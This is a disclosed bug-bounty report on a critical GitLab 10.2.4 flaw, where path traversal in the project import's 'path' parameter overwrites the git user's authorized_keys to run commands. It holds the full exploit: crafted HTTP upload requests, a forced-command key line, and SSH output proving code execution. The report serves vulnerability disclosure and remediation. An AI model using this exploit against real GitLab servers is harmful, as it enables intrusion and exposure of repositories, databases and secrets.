# Command injection by overwriting authorized_keys file through GitLab import

## Report Details
- **Report ID**: 298873
- **URL**: https://hackerone.com/reports/298873
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-12-17T03:11:21.852Z
- **Disclosed**: 2018-04-27T02:20:49.927Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
The `Projects::GitlabProjectsImportService` contains a vulnerability that allows an attacker to write files to arbitrary directories on the server. This leads to an arbitrary command execution vulnerability by overwriting the `authorized_keys` file. To reproduce, sign in to a GitLab instance that has GitLab import enabled. This is enabled by default, so I'd assume that this vulnerability applies to most GitLab instances. I've installed my GitLab instance through Omnibus.

Next up, intercept your network traffic and upload a GitLab import file. Observe the following request being made to the server:

**Request**
```
POST /import/gitlab_project HTTP/1.1
Host: gitlab-instance
...

------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="path"
test
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="namespace_id"

1
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="file"; filename="2017-12-17_02-20-093_root_test_export.tar.gz"
Content-Type: application/x-gzip

<file data>
```

Now take a closer look at the code that is being executed when this endpoint is hit:

**app/services/projects/gitlab_project_import_service.rb**
```ruby
# This service is an adapter used to for the GitLab Import feature, and
# creating a project from a template.
# The latter will under the hood just import an archive supplied by GitLab.
module Projects
  class GitlabProjectsImportService
    # ...

    def execute
      FileUtils.mkdir_p(File.dirname(import_upload_path))
      FileUtils.copy_entry(file.path, import_upload_path)

      Gitlab::ImportExport::ProjectCreator.new(params[:namespace_id],
                                               current_user,
                                               import_upload_path,
                                               params[:path]).execute
    end

    # ...

    def tmp_filename
      "#{SecureRandom.hex}_#{params[:path]}"
    end
  end
end
```

The `import_upload_path` will take the unsanitized `params[:path]` and append it to the GitLab uploads directory. This means that directories can be traversed in the `path` parameter. Another observation is that the file contents of the `file` aren't verified. This means that it may contain any data at that point.

My first though was to abuse this vulnerability to exploit a second-order remote code execution by writing an ERB template to the Rails views directory. However, that didn't work because of the file permissions of the GitLab Rails directory. I started looking for other files. I noticed that the uploads directory was writable for the `git` user. I took a closer look at the `/var/opt/gitlab/` directory and noticed the `.ssh/authorized_keys` directory. This file was writable for the `git` user, and thus, could be overwritten. This file can specify a command when an SSH connection is made. Now, going back to the original HTTP request, here's the updated request to overwrite the file:

```
POST /import/gitlab_project HTTP/1.1
Host: gitlab-instance
...

------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="path"

new-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="namespace_id"

1
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="file"; filename="2017-12-17_02-20-093_root_test_export.tar.gz"
Content-Type: application/x-gzip

command="ls -lash",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxc6GwCNoYCygtTXvoBpn1ACoF4hxhQviNa/0fm3LGGnEWLszswgw4QcaxXYiRumKjBv77eJT2/VbJylZX0uL6D/1/hubTmnp2A1QQJLk1rMvaUGlR8DeQpIcF1T61g3y4lEw5yhaaHRqRLiMpGammQhu0PO6PTDbKlGH+HxA0u8ku/L+lJXncNtpupw3qTDaAt8dgamKAU8RSZRyANK2BVYVj1W376OQFglHIeQW62LsNNgvr9Oe/Ze1YeQqvHO/lv0AeWYdLgjBJOiC5acBFexDBCr4odeSqkDPmKCMI28Mw28hC8fJIHh3vFqXjvlPtkuhDmdap4x+8gUxP77DWoMGw6LY8cuce+sSWY0teawMFW8Dm2R0Fr2iHzpCT8IpKgVHQ24BnmPGWjtWHxDX2DSzdE3GC6dWStVXud3iprgipM2SOxFkwHIISzLybjT1u/fK1sO4IW6E2T1cgSYQd7I2KhNJsgW57GljefD4cmhlwR39ZXZ1GtDCoUxtwZF3Qpr6XaSQ4nL71Wq+Y+v2TGeJzI9HXHRUSP2gZh/BI5kUdeUKkeylhLLouCqII5MlIlMmklXFOOPXoip/KCO36fYRZ1YAhxJ0J1JGX7ws4BnMMKHAHp+YOtRpAfGXcA+yEdMx50PRvXydqNeivfvDlY2JXRRIKUA03O9GoWmPLpQ==
------WebKitFormBoundaryA0TxBpQRLhL4lJQN--
```

In the request, replace my public SSH key with your own and replace `ls -lash` with whatever command you want to execute. When the request is sent to the server, a 302 Found will be returned. This is caused by a validation error that is returned because the project name contains invalid characters. Because the files aren't cleaned up, our exploit persists.

**Response**
```
HTTP/1.1 302 Found
Server: nginx
...
Location: http:/gitlab-instance/import/gitlab_project/new?namespace_id=1&path=new-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys
...
```

Now, to execute the command, run `ssh git@gitlab-instance`:

```
$ ssh git@gitlab-instance
PTY allocation request failed on channel 0
total 84K
4.0K drwxr-xr-x 18 root              root       4.0K Dec 15 04:33 .
4.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:32 ..
4.0K drwx------  2 git               root       4.0K Dec 15 04:32 backups
4.0K -rw-------  1 root              root         38 Dec 15 04:33 bootstrapped
4.0K drwx------  2 git               root       4.0K Dec 17 02:28 gitaly
4.0K -rw-r--r--  1 git               git         292 Dec 15 04:32 .gitconfig
4.0K drwx------  3 git               root       4.0K Dec 15 04:32 git-data
4.0K drwxr-xr-x  3 git               root       4.0K Dec 15 04:32 gitlab-ci
4.0K drwxr-xr-x  2 git               root       4.0K Dec 15 04:33 gitlab-monitor
4.0K drwxr-xr-x  9 git               root       4.0K Dec 15 04:33 gitlab-rails
4.0K drwx------  2 git               root       4.0K Dec 15 04:32 gitlab-shell
4.0K drwxr-x---  2 git               gitlab-www 4.0K Dec 17 02:28 gitlab-workhorse
4.0K drwx------  3 root              root       4.0K Dec 17 02:38 logrotate
4.0K drwxr-x---  9 root              gitlab-www 4.0K Dec 17 02:28 nginx
4.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:33 node-exporter
4.0K drwx------  2 gitlab-psql       root       4.0K Dec 15 04:34 postgres-exporter
4.0K drwxr-xr-x  3 gitlab-psql       root       4.0K Dec 17 02:28 postgresql
4.0K drwxr-x---  3 gitlab-prometheus root       4.0K Dec 15 04:33 prometheus
4.0K drwxr-x---  2 gitlab-redis      git        4.0K Dec 17 02:43 redis
4.0K drwx------  2 git               git        4.0K Dec 17 02:44 .ssh
4.0K -rw-r--r--  1 root              root         40 Dec 15 04:32 trusted-certs-directory-hash
```

This has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).

## Impact

An attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.

## Attachments
No attachments
